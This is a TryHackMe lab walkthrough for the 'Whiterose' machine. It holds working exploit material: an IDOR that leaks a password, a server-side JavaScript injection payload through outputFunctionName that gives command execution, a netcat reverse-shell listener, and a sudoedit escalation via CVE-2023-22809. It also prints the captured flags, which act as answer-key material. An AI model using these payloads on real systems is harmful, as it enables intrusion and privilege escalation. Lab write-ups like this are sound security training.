# Whiterose - TryHackMe Walkthrough

## Machine Information

| Category         | Value                       |
| ---------------- | --------------------------- |
| Platform         | TryHackMe                   |
| Machine Name     | Whiterose                   |
| Difficulty       | Easy                        |
| Operating System | Linux                       |
| Objective        | Capture User and Root Flags |

---

# Reconnaissance

Target IP:

```text
10.49.172.175
```

---

## Initial Nmap Scan

We begin with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 -T4 10.49.172.175
```

### Results

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP are exposed.

---

## Service Enumeration

Perform version detection.

```bash
nmap -sCV -p22,80 10.49.172.175
```

### Results

```text
22/tcp open  ssh OpenSSH 7.6p1 Ubuntu
80/tcp open  http nginx 1.14.0 (Ubuntu)
```

Observations:

* Ubuntu-based system
* OpenSSH 7.6p1
* Nginx 1.14.0
* No immediate vulnerabilities from banner information

---

# Web Enumeration

Opening the website reveals a maintenance page.

Before continuing, add the discovered hostname.

```bash
echo "10.49.172.175 cyprusbank.thm" | sudo tee -a /etc/hosts
```

The website appears to be under maintenance.

---

# Virtual Host Enumeration

When a website appears empty, virtual host enumeration is often useful.

Using FFUF:

```bash
ffuf \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
-u http://cyprusbank.thm/ \
-H "Host: FUZZ.cyprusbank.thm" \
-fw 1
```

### Results

```text
www     [Status: 200]
admin   [Status: 302]
```

Interesting.

A new virtual host is discovered:

```text
admin.cyprusbank.thm
```

Add it to hosts.

```bash
echo "10.49.172.175 admin.cyprusbank.thm" | sudo tee -a /etc/hosts
```

---

# Admin Portal Enumeration

Browsing:

```text
http://admin.cyprusbank.thm
```

reveals a login portal.

Let's enumerate further.

---

## Directory Enumeration

Using Gobuster:

```bash
gobuster dir \
-u http://admin.cyprusbank.thm/ \
-w /usr/share/wordlists/dirb/big.txt
```

### Results

```text
/Login
/Search
/messages
/settings
/logout
```

Several authenticated endpoints exist.

---

# IDOR Discovery

Investigating application functionality reveals an Insecure Direct Object Reference vulnerability.

The vulnerable endpoint:

```text
/messages?c=0
```

By manipulating the parameter value, messages belonging to other users become accessible.

One message contains highly sensitive information.

```text
Gayle Bev:
Of course! My password is 'p~]P@5!6;rs558:q'
```

A plaintext password has been disclosed.

This is sufficient to authenticate as Gayle Bev.

---

# Authenticated Access

Login using:

```text
Username: Gayle Bev
Password: p~]P@5!6;rs558:q
```

After authentication, additional functionality becomes available.

Including:

* Settings
* Customer Management
* Password Update Features

---

# Server-Side JavaScript Injection

While inspecting the settings functionality, user-controlled input is reflected within backend processing.

The vulnerable parameter:

```text
settings[view options][outputFunctionName]
```

Payload:

```text
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('COMMAND');//
```

This allows arbitrary command execution.

The application is running NodeJS.

By leveraging:

```javascript
process.mainModule.require('child_process')
```

we gain OS command execution.

---

# Reverse Shell

Start a listener.

```bash
nc -lvnp 4444
```

Execute a reverse shell payload through the code execution vulnerability.

Successful connection:

```text
Connection received

whoami

web
```

Initial foothold obtained.

---

# Stabilizing Shell

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Export terminal settings.

```bash
export TERM=xterm
```

---

# User Flag

Navigate to the user's directory.

```bash
cat user.txt
```

Output:

```text
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

User flag captured.

---

# Privilege Escalation

Checking sudo permissions.

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD:
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Interesting.

The system allows sudoedit on a specific file.

---

# CVE-2023-22809

Researching sudoedit bypasses reveals:

```text
CVE-2023-22809
```

This vulnerability allows an attacker to manipulate editor arguments and access arbitrary files.

Configure EDITOR:

```bash
export EDITOR="vi -- /root/root.txt"
```

Execute:

```bash
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Instead of opening the allowed file, sudoedit opens:

```text
/root/root.txt
```

allowing the root flag to be read.

---

# Root Flag

```bash
cat /root/root.txt
```

Output:

```text
THM{4nd_uR_p4ck4g3s}
```

Root compromise complete.

---

# Flags

## User

```text
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

## Root

```text
THM{4nd_uR_p4ck4g3s}
```

---

# Attack Path Summary

```text
Nmap Scan
      │
      ▼
Port 80 Enumeration
      │
      ▼
Maintenance Page
      │
      ▼
Virtual Host Discovery
      │
      ▼
admin.cyprusbank.thm
      │
      ▼
IDOR Vulnerability
      │
      ▼
Credential Disclosure
      │
      ▼
Login as Gayle Bev
      │
      ▼
NodeJS Code Execution
      │
      ▼
Reverse Shell as web
      │
      ▼
sudo -l
      │
      ▼
CVE-2023-22809
      │
      ▼
Read Root Flag
```

---

# Key Takeaways

* Virtual host enumeration remains critical during web assessments.
* IDOR vulnerabilities can expose highly sensitive information.
* NodeJS applications become dangerous when user input reaches server-side execution contexts.
* Dependency management and package updates are essential.
* Misconfigured sudoedit permissions combined with vulnerable sudo versions can lead to full privilege escalation.

Machine rooted successfully.
